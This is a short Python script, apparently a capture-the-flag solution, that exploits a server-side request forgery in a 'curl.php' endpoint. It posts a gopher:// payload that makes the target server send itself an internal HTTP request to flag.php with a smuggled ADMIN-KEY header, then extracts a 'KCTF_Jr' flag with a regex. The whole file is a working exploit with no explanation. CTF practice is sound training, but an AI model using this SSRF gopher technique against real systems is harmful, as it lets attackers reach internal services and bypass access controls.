import requests
import re

target_url = 'http://172.24.218.139:10201/'

payload = "gopher://127.0.0.1:80/_GET%20/flag.php%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aADMIN-KEY:s2cr3t%0d%0a%0d%0a"

r = requests.post(target_url + "/curl.php", data={"url":payload})

print(re.findall("(KCTF_Jr{.*})", r.text)[0])